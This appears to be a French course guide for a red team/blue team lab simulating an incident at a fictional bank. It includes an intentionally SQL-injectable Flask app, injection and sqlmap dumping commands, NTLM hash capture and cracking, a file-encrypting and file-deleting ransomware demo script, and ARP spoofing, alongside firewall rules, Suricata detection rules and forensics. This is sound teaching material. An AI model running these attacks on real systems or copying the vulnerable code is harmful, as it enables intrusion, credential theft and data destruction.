# 🏦 SecureBank – Guide Complet du Projet
## Final Project: SecureBank Incident – Attack vs. Defense Challenge

---

## 🎯 But du Projet & Attentes de l'Enseignant

Ce projet simule un **incident de cybersécurité réel** dans une petite banque fictive appelée *SecureBank*.
L'enseignant veut que vous démontriez que vous maîtrisez **les deux côtés de la cybersécurité** : attaquer ET défendre.

En binôme :
- Un étudiant joue le **Red Team (attaquant)**
- L'autre joue le **Blue Team (défenseur)**

L'enseignant veut voir :
- Que vous savez **construire un environnement réseau isolé** (VMs)
- Que le Red Team sait **exploiter de vraies vulnérabilités**
- Que le Blue Team sait **détecter, bloquer et récupérer** après une attaque
- Que vous documentez tout professionnellement (rapport + présentation)

---

## 🖥️ Architecture du Lab

| VM            | IP              | Rôle                  |
|---------------|-----------------|-----------------------|
| Kali Linux    | 192.168.100.10  | Attaquant (Red Team)  |
| Ubuntu Server | 192.168.100.20  | Cible (services banque)|
| Windows Host  | 192.168.100.30  | Victime (employé)     |

---

## 📅 Planning Suggéré

```
SEMAINE 1 → Setup des 3 VMs + réseau + services
SEMAINE 2 → Red Team : choisir 2 missions et les exécuter
SEMAINE 3 → Blue Team : configurer défenses et détecter
SEMAINE 4 → Rapport + préparation présentation individuelle
```

---

# PHASE 1 — Mise en Place de l'Environnement

## Étape 1.1 — Réseau VirtualBox isolé

```bash
# Créer un réseau "Host-Only" : 192.168.100.0/24
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.100.1 --netmask 255.255.255.0
```

**Explication :**
- `VBoxManage` : outil CLI de VirtualBox
- `hostonlyif create` : crée une interface réseau virtuelle privée sans internet
- Le réseau `192.168.100.0/24` donne des IPs de `.1` à `.254`

---

## Étape 1.2 — Installation des services Ubuntu Server

```bash
# Mise à jour du système
sudo apt update && sudo apt upgrade -y
```
> Met à jour la liste des paquets et installe les dernières versions. `-y` répond automatiquement "oui".

```bash
# Installer Apache2 (serveur web)
sudo apt install apache2 -y
sudo systemctl enable apache2
sudo systemctl start apache2
```
> `apache2` est le serveur web. `systemctl enable` le lance au démarrage, `systemctl start` le lance immédiatement.

```bash
# Installer Python3 et Flask (portail bancaire)
sudo apt install python3 python3-pip -y
pip3 install flask flask-login
```
> Flask est un framework web Python léger pour créer l'application bancaire vulnérable.

```bash
# Installer SMB (partage de fichiers)
sudo apt install samba -y
sudo systemctl enable smbd
```
> Samba permet le partage de fichiers via le protocole SMB — cible d'attaque classique.

```bash
# Installer OpenVPN
sudo apt install openvpn -y
```
> OpenVPN crée un tunnel VPN chiffré — le gateway réseau de la banque.

```bash
# Installer Suricata (IDS)
sudo apt install suricata -y
sudo systemctl enable suricata
```
> Suricata est un Système de Détection d'Intrusion (IDS) qui analyse le trafic réseau.

```bash
# Installer iptables
sudo apt install iptables iptables-persistent -y
```
> `iptables` est le pare-feu Linux. `iptables-persistent` sauvegarde les règles après redémarrage.

---

## Étape 1.3 — Créer la base de données bancaire SQLite

```bash
# Créer le répertoire de l'application
sudo mkdir -p /var/www/bank
cd /var/www/bank

# Installer sqlite3
sudo apt install sqlite3 -y

# Créer la base de données avec de faux clients
sqlite3 db.sqlite <<EOF
CREATE TABLE accounts (
    id INTEGER PRIMARY KEY,
    customer_name TEXT,
    email TEXT,
    balance REAL,
    password_hash TEXT
);
INSERT INTO accounts VALUES (1,'Alice Martin','alice@securebank.cm',5000.00,'5f4dcc3b5aa765d61d8327deb882cf99');
INSERT INTO accounts VALUES (2,'Bob Nguyen','bob@securebank.cm',12000.00,'e10adc3949ba59abbe56e057f20f883e');
INSERT INTO accounts VALUES (3,'Carol Smith','carol@securebank.cm',3200.00,'25f9e794323b453885f5181f1b624d0b');
INSERT INTO accounts VALUES (4,'David Eto','david@securebank.cm',8700.00,'8d3533d75ae2c3966d7e0d4fcc69216b');
INSERT INTO accounts VALUES (5,'Eve Biya','eve@securebank.cm',15000.00,'96e79218965eb72c92a549dd5a330112');
EOF
```

**Explication :**
- `sqlite3 db.sqlite` : crée/ouvre la base de données
- `CREATE TABLE` : crée la table clients
- `INSERT INTO` : ajoute de faux clients avec des mots de passe MD5 faibles (volontairement)

---

## Étape 1.4 — Application Flask vulnérable

```bash
sudo nano /var/www/bank/app.py
```

Contenu du fichier `app.py` :

```python
from flask import Flask, request, render_template_string, session
import sqlite3, os

app = Flask(__name__)
app.secret_key = "supersecret123"  # Clé faible — volontairement vulnérable

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        user = request.form['username']
        pwd  = request.form['password']
        # VULNÉRABILITÉ : injection SQL intentionnelle
        conn = sqlite3.connect('/var/www/bank/db.sqlite')
        query = f"SELECT * FROM accounts WHERE customer_name='{user}' AND password_hash='{pwd}'"
        row = conn.execute(query).fetchone()
        if row:
            session['user'] = user
            return f"Welcome {user}! Balance: ${row[3]}"
        return "Invalid credentials", 401
    return '''<form method="post">
        User: <input name="username"><br>
        Pass: <input name="password" type="password"><br>
        <input type="submit" value="Login"></form>'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

```bash
# Lancer l'application en arrière-plan
sudo python3 /var/www/bank/app.py &
```

---

## Étape 1.5 — Certificat HTTPS auto-signé

```bash
sudo mkdir -p /etc/ssl/bank
cd /etc/ssl/bank

# Créer la clé privée de la CA
openssl genrsa -out ca.key 4096
```
> `openssl genrsa` génère une clé RSA privée de 4096 bits pour l'autorité de certification.

```bash
# Créer le certificat de la CA
openssl req -new -x509 -days 365 -key ca.key -out ca.crt \
  -subj "/C=CM/ST=Centre/L=Yaounde/O=SecureBank/CN=SecureBank-CA"
```
> `-x509` : certificat auto-signé | `-days 365` : valable 1 an | `-subj` : informations de l'organisation

```bash
# Créer la clé du serveur web
openssl genrsa -out server.key 2048

# Créer la demande de signature (CSR)
openssl req -new -key server.key -out server.csr \
  -subj "/C=CM/ST=Centre/L=Yaounde/O=SecureBank/CN=192.168.100.20"

# Signer avec la CA
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out server.crt
```

```bash
# Activer les modules Apache et HTTPS
sudo a2enmod ssl headers proxy proxy_http
sudo a2ensite bank-ssl
sudo systemctl restart apache2
```

**Configuration Apache** (`/etc/apache2/sites-available/bank-ssl.conf`) :

```apache
<VirtualHost *:443>
    ServerName 192.168.100.20
    SSLEngine on
    SSLCertificateFile    /etc/ssl/bank/server.crt
    SSLCertificateKeyFile /etc/ssl/bank/server.key
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    ProxyPass / http://localhost:5000/
    ProxyPassReverse / http://localhost:5000/
</VirtualHost>
```
> `HSTS` (Strict-Transport-Security) force le navigateur à toujours utiliser HTTPS — empêche le SSL stripping.

---

## Étape 1.6 — Configurer le partage SMB

```bash
sudo nano /etc/samba/smb.conf
```

```ini
[BankShare]
   path = /srv/bank-share
   browseable = yes
   read only = no
   guest ok = no
   valid users = bankuser
```

```bash
sudo mkdir -p /srv/bank-share
sudo useradd -M bankuser
sudo smbpasswd -a bankuser
# Entrer un mot de passe faible (ex: Password123)
sudo systemctl restart smbd
```

---

## Étape 1.7 — Fichiers cibles sur Windows Host

Créer manuellement sur le Windows Host :
- `C:\Users\Employee\Desktop\customer_emails.txt`
- `C:\Users\Employee\Desktop\financial_forecast.xlsx`
- `C:\TestRansom\` (dossier cible du ransomware simulé — mettre quelques fichiers .txt dedans)

---

# PHASE 2 — Red Team (Attaque)

> **Objectif : réussir 2 des 3 missions ci-dessous.**

---

## Mission A — Vol de données (SQLite)

```bash
# Reconnaissance réseau
nmap -sV -sC -p- 192.168.100.20
```
> `-sV` : détecte les versions des services | `-sC` : lance les scripts par défaut | `-p-` : scanne les 65535 ports

```bash
# Tester l'injection SQL manuellement
curl -X POST http://192.168.100.20:5000/login \
  -d "username=' OR '1'='1&password=' OR '1'='1"
```
> La charge `' OR '1'='1` est une injection SQL classique qui contourne l'authentification.

```bash
# Extraction automatique avec SQLMap
sqlmap -u "http://192.168.100.20:5000/login" \
  --data="username=test&password=test" \
  --dump --batch
```
> `sqlmap` automatise la détection et l'exploitation des injections SQL. `--dump` extrait toutes les données.

---

## Mission B — Ransomware simulé sur Windows

```bash
# Capturer les hashes NTLM avec Responder
sudo responder -I eth0 -rdw
```
> `responder` capture les hashes NTLM quand un client Windows essaie de s'authentifier. `-I eth0` : interface réseau.

```bash
# Craquer le hash capturé avec Hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```
> `-m 5600` : mode NTLMv2 | `rockyou.txt` : wordlist intégrée à Kali | Hashcat teste chaque mot de passe.

Script PowerShell de démonstration (`ransom_demo.ps1`) — **uniquement sur C:\TestRansom\** :

```powershell
$key = [System.Text.Encoding]::UTF8.GetBytes("SecureBank2024Key!")
$targetFolder = "C:\TestRansom"
Get-ChildItem -Path $targetFolder -File | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encrypted = $content | ForEach-Object { $_ -bxor $key[0] }
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $encrypted)
    Remove-Item $_.FullName
}
Set-Content "$targetFolder\RANSOM_NOTE.txt" "Your files are encrypted! Contact admin."
```

```bash
# Transférer le script via SMB
smbclient //192.168.100.30/C$ -U "bankuser%Password123" \
  -c "put /tmp/ransom_demo.ps1 Users\\Employee\\Desktop\\ransom_demo.ps1"
```
> `smbclient` accède à un partage SMB depuis Linux. `-c "put"` transfère un fichier.

---

## Mission C — Session Hijacking (MITM)

```bash
# Lancer Bettercap
sudo bettercap -iface eth0
```

```
# Dans la console Bettercap :
set arp.spoof.targets 192.168.100.30
arp.spoof on
set net.sniff.filter tcp port 5000
net.sniff on
```
> `arp.spoof` empoisonne la table ARP du Windows pour que son trafic passe par Kali (Man-in-the-Middle). `net.sniff` capture les cookies de session.

---

# PHASE 3 — Blue Team (Défense)

## Étape 3.1 — Règles iptables

```bash
# Réinitialiser les règles
sudo iptables -F
sudo iptables -X

# Politique par défaut : tout bloquer
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Autoriser loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Autoriser connexions établies
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Autoriser SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Autoriser HTTPS
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Autoriser OpenVPN
sudo iptables -A INPUT -p udp --dport 1194 -j ACCEPT

# BLOQUER SMB depuis l'IP de Kali
sudo iptables -A INPUT -s 192.168.100.10 -p tcp --dport 445 -j DROP

# Sauvegarder les règles
sudo netfilter-persistent save
```

**Explications :**
- `-F` / `-X` : vide toutes les règles existantes
- `-P INPUT DROP` : politique par défaut = tout bloquer
- `-A INPUT` : ajoute une règle pour le trafic entrant
- `-j DROP` : bloque silencieusement | `-j ACCEPT` : autorise
- `--dport` : port de destination | `-s` : adresse source

---

## Étape 3.2 — Règles Suricata IDS

Fichier `/etc/suricata/rules/local.rules` :

```
# Détecter un scan Nmap
alert tcp any any -> $HOME_NET any (msg:"NMAP SCAN DETECTED"; \
  flags:S; threshold: type both, track by_src, count 20, seconds 3; \
  classtype:network-scan; sid:1000001; rev:1;)

# Détecter ARP spoofing (Bettercap)
alert arp any any -> any any (msg:"ARP SPOOFING DETECTED"; \
  arp.opcode:2; threshold: type both, track by_src, count 10, seconds 5; \
  sid:1000002; rev:1;)

# Détecter tentatives SMB
alert tcp any any -> $HOME_NET 445 (msg:"SMB LOGIN ATTEMPT"; \
  content:"|FF|SMB"; classtype:attempted-user; sid:1000003; rev:1;)

# Détecter EternalBlue
alert tcp any any -> $HOME_NET 445 (msg:"ETERNALBLUE EXPLOIT ATTEMPT"; \
  content:"|00 00 00 90|"; depth:8; classtype:attempted-admin; sid:1000004; rev:1;)
```

```bash
# Redémarrer Suricata
sudo systemctl restart suricata

# Voir les alertes en temps réel
sudo tail -f /var/log/suricata/fast.log
```

**Explications des règles :**
- `alert` : génère une alerte dans le log
- `msg` : message d'alerte affiché dans le log
- `sid` : identifiant unique de la règle (obligatoire)
- `threshold` : évite le spam d'alertes répétitives
- `classtype` : catégorie de l'attaque

---

## Étape 3.3 — Snapshots ZFS pour recovery

```bash
# Installer ZFS
sudo apt install zfsutils-linux -y

# Créer un pool ZFS (sur un disque dédié)
sudo zpool create bankpool /dev/sdb

# Créer un dataset pour les données bancaires
sudo zfs create bankpool/bankdata
sudo cp -r /var/www/bank/* /bankpool/bankdata/

# Prendre un snapshot manuel
sudo zfs snapshot bankpool/bankdata@backup-$(date +%Y%m%d-%H%M)

# Automatiser les snapshots toutes les heures
echo "0 * * * * root zfs snapshot bankpool/bankdata@auto-\$(date +\%Y\%m\%d-\%H\%M)" \
  | sudo tee -a /etc/crontab

# Lister les snapshots disponibles
sudo zfs list -t snapshot

# Restaurer depuis un snapshot
sudo zfs rollback bankpool/bankdata@backup-20240601-1000
```

**Explications :**
- `zpool create` : crée un pool de stockage ZFS
- `zfs snapshot` : crée un point de restauration instantané
- `zfs rollback` : restaure les données à l'état du snapshot choisi
- `crontab` `0 * * * *` : lance la commande toutes les heures

---

## Étape 3.4 — Sysmon sur Windows Host

Dans PowerShell (administrateur) :

```powershell
# Installer Sysmon (après avoir téléchargé depuis Sysinternals)
.\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Voir les logs Sysmon
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Select-Object -First 20

# Chercher des créations de processus suspects (Event ID 1)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 1} |
  Select-Object TimeCreated, Message | Format-List

# Chercher des connexions réseau (Event ID 3)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 3} |
  Select-Object TimeCreated, Message | Format-List
```

**Event IDs importants à surveiller :**
| ID | Événement |
|----|-----------|
| 1  | Création de processus |
| 3  | Connexion réseau |
| 11 | Modification de fichier |
| 13 | Modification du registre |

---

# PHASE 4 — Analyse Forensique

## Volatility (analyse mémoire Windows)

```bash
# Analyser un dump mémoire RAM
volatility -f windows_memory.raw --profile=Win10x64 pslist
```
> `pslist` : liste tous les processus actifs au moment du dump

```bash
volatility -f windows_memory.raw --profile=Win10x64 netscan
```
> `netscan` : affiche toutes les connexions réseau actives

```bash
volatility -f windows_memory.raw --profile=Win10x64 filescan | grep TestRansom
```
> `filescan` : cherche des fichiers en mémoire — utile pour prouver l'activité du ransomware

---

# PHASE 5 — Rapport à Rendre

## Structure du rapport (30% de la note)

| Section | Contenu attendu |
|---|---|
| **Setup** | Captures d'écran IPs, services, fichiers créés |
| **Red Team Log** | Commandes utilisées + sorties + quel lab correspond |
| **Blue Team Log** | Alertes Suricata, règles iptables, analyse Volatility |
| **Timeline** | Chronologie de l'attaque vue des 2 côtés |
| **Remediation** | 5 corrections concrètes (ex: paramétrage HTTPS, patch SMB) |

## Présentation individuelle (70% de la note)

**Red Team présente :**
- Comment ils ont utilisé : chiffrement hybride, hash cracking, MITM, Metasploit
- Démonstration du vol de données ou du ransomware simulé
- Quelles défenses les ont bloqués ?

**Blue Team présente :**
- Configuration PKI, firewall/IPS, Sysmon & Volatility, Suricata
- Affichage des logs de détection d'attaque
- Démonstration de la restauration depuis un snapshot

---

> **💡 Conseil clé :** Documentez **chaque commande avec une capture d'écran** au moment où vous la lancez.
> L'enseignant veut voir la preuve que vous avez réellement exécuté les attaques et les défenses.
